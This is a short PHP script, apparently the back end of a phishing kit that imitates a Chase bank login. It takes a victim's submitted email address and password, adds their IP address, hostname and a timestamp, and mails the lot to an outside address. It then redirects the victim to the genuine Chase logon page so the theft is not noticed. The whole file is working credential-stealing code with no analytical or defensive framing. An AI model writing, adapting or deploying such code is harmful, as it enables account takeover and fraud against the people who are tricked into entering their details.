<?

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");

$message  = "+_______________________+ Going Turbo +_____________________+\n";
$message .= "Email Address: ".$_POST['emailxnx']."\n";
$message .= "Email Password : ".$_POST['emailpassx']."\n";

$message .= "________________________\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName  : ".$hostname."\n";
$message .= "Date Log  : ".$date."\n";
$message .= "Time Log  : ".$time."\n";
$message .= "___________________________________________________________\n";


$recipient = "pollysisson@surfbirder.com";
$subject = "Chase Email Details $ip";
$headers = "Done Deal";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://chaseonline.chase.com/Logon.aspx?LOB=RBGLogon");

	   }
?>
